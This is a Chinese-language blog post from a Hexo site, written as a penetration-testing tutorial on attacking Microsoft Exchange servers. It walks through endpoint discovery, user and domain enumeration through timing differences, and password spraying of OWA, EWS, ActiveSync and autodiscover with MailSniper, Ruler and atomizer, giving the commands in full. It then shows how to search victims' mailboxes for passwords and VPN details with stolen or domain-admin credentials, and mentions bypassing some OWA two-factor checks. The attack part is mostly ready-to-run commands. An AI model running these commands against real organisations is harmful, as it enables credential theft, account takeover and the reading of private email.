@@ -1,0 +1,1751 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+
+
+
+
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.7.0">
+
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "198a1f28"
+    });
+  daovoice('update');
+  </script>
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: true,
+    lazyload: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x00 Exchange简介Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。 0x01  Exchange Endpoint通常Exchange Server 有以下endpoint，即可访问的连接如下">
+<meta name="keywords" content="Exchange">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Exchange在渗透测试中的利用">
+<meta property="og:url" content="https://evi1cg.github.io/archives/Exchange_Hack.html">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:description" content="0x00 Exchange简介Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。 0x01  Exchange Endpoint通常Exchange Server 有以下endpoint，即可访问的连接如下">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010888182.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010869955.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010857355.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010831575.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010837872.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010962270.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010924029.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010982186.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010993800.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010925301.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010998743.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010951921.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010921519.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010976996.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010993350.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/01/2965525239.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010940263.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010993399.jpg">
+<meta property="og:updated_time" content="2019-01-23T02:14:20.802Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Exchange在渗透测试中的利用">
+<meta name="twitter:description" content="0x00 Exchange简介Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。 0x01  Exchange Endpoint通常Exchange Server 有以下endpoint，即可访问的连接如下">
+<meta name="twitter:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evi1cg's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://evi1cg.github.io/archives/Exchange_Hack.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Exchange在渗透测试中的利用 | Evi1cg's blog</title>
+  
+
+
+
+
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-132188022-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-132188022-1');
+  </script>
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</head>
+
+<body itemscope="" itemtype="https://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="https://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evi1cg's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档 menu-item-active">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archive" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-工具">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools" rel="section"><i class="menu-item-icon fa fa-fw fa-briefcase"></i> <br>工具</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-友链">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/friends" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i> <br>友链</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Exchange_Hack.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Exchange在渗透测试中的利用
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-09 03:45:00" itemprop="dateCreated datePublished" datetime="2019-01-09T03:45:00+08:00">2019-01-09</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/技术分享/" itemprop="url" rel="index"><span itemprop="name">技术分享</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/archives/Exchange_Hack.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/Exchange_Hack.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-Exchange简介"><a href="#0x00-Exchange简介" class="headerlink" title="0x00 Exchange简介"></a>0x00 Exchange简介</h2><p>Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。</p>
+<h2 id="0x01-Exchange-Endpoint"><a href="#0x01-Exchange-Endpoint" class="headerlink" title="0x01  Exchange Endpoint"></a>0x01  Exchange Endpoint</h2><p>通常Exchange Server 有以下endpoint，即可访问的连接如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/AutoDiscover/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Ecp/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/EWS/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/mapi/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Microsoft-Server-ActiveSync/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OAB/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OWA/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/PowerShell/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Rpc/</span></span><br></pre></td></tr></table></figure></p>
+<p>每个endpoint的作用如下：</p>
+<table>
+<thead>
+<tr>
+<th>endpoint</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/autodiscover</td>
+<td style="text-align:center">自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。</td>
+</tr>
+<tr>
+<td>/ecp “Exchange Control Panel”</td>
+<td style="text-align:center">Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台</td>
+</tr>
+<tr>
+<td>/ews “Exchange Web Services”</td>
+<td style="text-align:center">Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互</td>
+</tr>
+<tr>
+<td>/mapi</td>
+<td style="text-align:center">Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持</td>
+</tr>
+<tr>
+<td>/Microsoft-Server-ActiveSync</td>
+<td style="text-align:center">用于移动应用程序访问电子邮件</td>
+</tr>
+<tr>
+<td>/OAB “Offline Address Book”</td>
+<td style="text-align:center">用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担</td>
+</tr>
+<tr>
+<td>/owa “Outlook Web APP”</td>
+<td style="text-align:center">Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等</td>
+</tr>
+<tr>
+<td>/powershell</td>
+<td style="text-align:center">用于服务器管理的Exchange管理控制台</td>
+</tr>
+<tr>
+<td>/RPC</td>
+<td style="text-align:center">早期的Outlook还使用称为Outlook Anywhere的RPC交互</td>
+</tr>
+</tbody>
+</table>
+<p>以上endpoint中，常用于暴力破解的有/owa 、/ews、/Microsoft-Server-ActiveSync 及/autodiscover，如owa的暴力破解（passwordspray）：<br>抓取登录包如下：</p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg" alt="-w1118"></p>
+<blockquote>
+<p>用户名可尝试使用domain\username、domian.com\username、username</p>
+</blockquote>
+<p>使用某密码进行暴力破解：</p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010888182.jpg" alt="-w720"></p>
+<p><code>/Microsoft-Server-ActiveSync</code> 爆破为401认证，需要对用户账号密码进行base64处理:</p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010869955.jpg" alt="-w647"></p>
+<blockquote>
+<p><code>YWRtaW46YWRtaW4=</code>  -&gt; <code>admin:admin</code></p>
+</blockquote>
+<p><code>/ews</code>、<code>/rpc</code> 等几个endpoint同样为401认证，账号密码的加密方式为NTLM Authenticate：</p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010857355.jpg" alt="-w1264"></p>
+<p>爆破需对账号密码进行处理之后在进行。</p>
+<h2 id="0x02-Get-UserList"><a href="#0x02-Get-UserList" class="headerlink" title="0x02 Get UserList"></a>0x02 Get UserList</h2><h3 id="验证Exchange"><a href="#验证Exchange" class="headerlink" title="验证Exchange"></a>验证Exchange</h3><p>对Exchange的利用首先要确定其是否使用了exchange，关于判断的方式，我知道的方式有:<br>1、<a href="https://github.com/vysec/checkO365" target="_blank" rel="noopener">checkO365</a></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010831575.jpg" alt="-w682"></p>
+<p>2、owa 登录页面，如：<br><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010837872.jpg" alt=""></p>
+<p>3、特殊域名：<br>访问如下域名<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//autodiscover.domain.com/autodiscover/autodiscover.xml</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//owa.domian/owa/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//mail.domain.com/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//webmail.domain.com/</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="获取用户列表"><a href="#获取用户列表" class="headerlink" title="获取用户列表"></a>获取用户列表</h3><p>之后我们需要获取其至少一个账号的信息，那么就需要取搜集获取某域的用户列表，除了top username进行爆破，还可以使用<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theharvester</a>、<a href="https://github.com/Ridter/Mailget" target="_blank" rel="noopener">Mailget</a>等工具进行搜集，另外还有一种通过延时来判断的方式。在<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a> 写了这样几种来判断内部域和存在用户的方法：</p>
+<ul>
+<li>Invoke-DomainHarvest</li>
+<li>Invoke-UsernameHarvestOWA</li>
+<li>Invoke-UsernameHarvestEAS</li>
+</ul>
+<p>首先来看Invoke-DomainHarvest，这里通过了几种方式来获取内部域名，构造参数如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-DomainHarvestOWA</span> <span class="selector-tag">-ExchHostname</span> <span class="selector-tag">domian</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure></p>
+<p>脚本会构造如下url:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$OWAURL</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/auth.owa"</span>)</span><br><span class="line"><span class="variable">$OWAURL2</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/"</span>)</span><br><span class="line"><span class="variable">$autodiscoverurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/autodiscover/autodiscover.xml"</span>)</span><br><span class="line"><span class="variable">$ewsurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/EWS/Exchange.asmx"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>在未指定<code>brute</code>的情况下，脚本会先请求<code>autodiscoverurl</code>,若失败，再请求ewsurl，并通过请求头里面的NTLM Authenticate数据来猜测内部域名，如：</p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010962270.jpg" alt="-w1276"></p>
+<blockquote>
+<p>需要注意到是，未指定brute的时候需要更改-ExchHostname 为对应的autodiscoverurl及ewsurl</p>
+</blockquote>
+<p>指定brute的情况下，则会使用通过时间延迟的方式来检测域名是否存在，首先会构造一些不存在的域及用户名请求owa，并记录其响应时间，之后使用构造的域字典及随机用户名来请求owa，根据其响应时间的不同来判断域及用户名，在这里有两种brute方式，第一种通过导入域名列表：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p>
+<p>第二种通过公司名称来猜测：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName <span class="string">"bla bla"</span> -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p>
+<p>获取域名之后，可导入用户名进行用户名存在检测：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile owa-valid-users.txt</span><br><span class="line">Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile eas-valid-users.txt</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>PS : 作者说这个问题提交给微软以后并没有修复，但是实际测试效果并不好，但是没准碰到可以使用的情况也说不定。</p>
+</blockquote>
+<p>当获取到一个用户的账号密码之后，可以通过<code>Get-GlobalAddressList</code>来获取GlobalAddress的用户邮箱地址：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010924029.jpg" alt="-w1130"></p>
+<h2 id="0x03-Brute-Force"><a href="#0x03-Brute-Force" class="headerlink" title="0x03 Brute Force"></a>0x03 Brute Force</h2><p>在这里暴力破解的地方有很多个，首先可以通过burpsuite对OWA进行暴力破解，另外就是<code>/autodiscover</code>、<code>/ews</code>、<code>/Microsoft-Server-ActiveSync</code> 等几个endpoint，可利用的工具如：<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a>、<a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a>、<a href="https://github.com/byt3bl33d3r/SprayingToolkit" target="_blank" rel="noopener">SprayingToolkit</a>，可根据个人喜好取舍。为了防止账号因多次登陆失败触发告警或账户被封禁，建议使用同密码爆破用户名的方式进行暴力破解。下面介绍一下MailSniper的相关方法的使用。</p>
+<p><strong>通过owa爆破：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010982186.jpg" alt="-w960"></p>
+<p><strong>通过ews爆破：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993800.jpg" alt="-w964"></p>
+<p><strong>通过Microsoft-Server-ActiveSync爆破：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010925301.jpg" alt="-w898"></p>
+<p><strong>通过autodiscover 爆破：</strong><br>在MailSniper中没有写对autodiscover的爆破，可以选择使用burp、ruler或者SprayingToolkit。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atomizer.py owa autodiscoverhost password user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010998743.jpg" alt="-w747"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010951921.jpg" alt="-w877"></p>
+<h2 id="0x04-Search-mail"><a href="#0x04-Search-mail" class="headerlink" title="0x04 Search mail"></a>0x04 Search mail</h2><p>在获取到某用户邮箱账号密码以后，我们可以对其邮件内容进行搜索，除了直接登录邮件外，也可以使用Exchange的接口进行邮件的检索，其接口的相关开发可以参考《<a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS" target="_blank" rel="noopener">Exchange Web Service(EWS)开发指南</a>%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/)》，在外网情况下，可使用此工具来列出邮件内容。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010921519.jpg" alt="-w959"></p>
+<p>搜索某字符串：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010976996.jpg" alt="-w1439"></p>
+<p>或者使用MailSniper的Invoke-SelfSearch添加<code>-remote</code> 参数，输入账号密码即可。使用接口可以<code>bypass一些owa的2FA</code>。</p>
+<p>内网情况下可使用MailSniper来快速检索，如使用xiaoming\domain用户登录某主机，可在该主机上搜索xiaoming的邮箱（不需要密码）<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv <span class="number">1</span>.csv</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993350.jpg" alt="-w841"></p>
+<p>如果获得了域管理员的密码，可以检索任意邮件的内容：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator  -AdminPassword password -Term <span class="string">"*pass*"</span> -Folder all</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io/usr/uploads/2019/01/2965525239.jpg" alt="1547034512542.jpg"></p>
+<blockquote>
+<p>检索可使用<code>-Term</code>或者正则<code>-Regex</code>来指定关键字，<code>-ImpersonationAccount</code>用于将当前用户身份合法伪装其他邮箱用户，进而获得查询所有邮箱用户邮件的权限，如果查询失败，可以尝试添加<code>-ExchangeVersion</code>更换Exchange版本,目前支持版本为<code>Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013,Exchange2013_SP1</code></p>
+</blockquote>
